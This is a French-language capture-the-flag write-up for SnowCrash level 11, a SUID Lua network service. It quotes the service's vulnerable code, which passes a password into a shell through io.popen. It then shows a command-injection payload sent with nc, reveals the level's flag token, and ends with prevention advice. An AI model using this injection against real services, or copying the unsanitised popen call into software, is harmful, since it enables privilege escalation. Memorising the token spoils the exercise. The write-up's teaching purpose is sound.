## SnowCrash - Level 11 - Injection de commande via Script Lua

### 1. Analyse de l'existant

Dans ce niveau, nous trouvons un fichier :

* **`level11`** : Un script Lua (ou un binaire l'appelant) avec le bit **SUID** activé, appartenant à **flag11**.

### 2. Analyse du code source

Le script Lua crée un serveur qui écoute sur `localhost:5151`. La vulnérabilité réside dans la fonction `hash()` :

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  -- ...
end

```

**Le problème :**
Le script utilise `io.popen`, une fonction qui ouvre un pipe vers un processus shell. Il concatène directement l'entrée utilisateur (`pass`) dans la chaîne de commande sans aucun nettoyage (sanitization).

### 3. La faille : Injection de Commande (Command Injection)

En utilisant des métacaractères du shell (comme `;`, `&`, `|` ou ```), nous pouvons manipuler la commande finale exécutée par le système.

Si nous envoyons `; getflag > /tmp/reussite`, la commande système devient :
`echo ; getflag > /tmp/reussite | sha1sum`

Le shell interprète cela comme :

1. `echo` : Affiche une ligne vide.
2. `getflag > /tmp/reussite` : Exécute `getflag` avec les privilèges de **flag11** et redirige la sortie dans un fichier accessible.
3. `| sha1sum` : Tente de hacher le résultat (ce qui échoue ou n'a aucun impact sur notre action).

### 4. Exploitation

1. **Connexion au service :**
```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151

```


2. **Injection au prompt Password :**
```text
Password: ; getflag > /tmp/reussite

```


3. **Récupération du flag :**
```bash
level11@SnowCrash:~$ cat /tmp/reussite
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

```



### 5. Conclusion et Sécurité

Ce niveau illustre le danger d'appeler des commandes système externes avec des données non fiables.

**Mesures de prévention :**

* **Privilégier les bibliothèques natives :** Au lieu d'appeler `sha1sum` via le shell, il aurait fallu utiliser une bibliothèque de hachage Lua native.
* **Sanitisation :** Si l'appel système est inévitable, il faut échapper tous les caractères spéciaux ou n'autoriser qu'une liste blanche (alphanumérique uniquement).
* **Principe du moindre privilège :** Un service réseau ne devrait jamais tourner avec des privilèges étendus (SUID) s'il manipule des entrées utilisateur de manière non sécurisée.
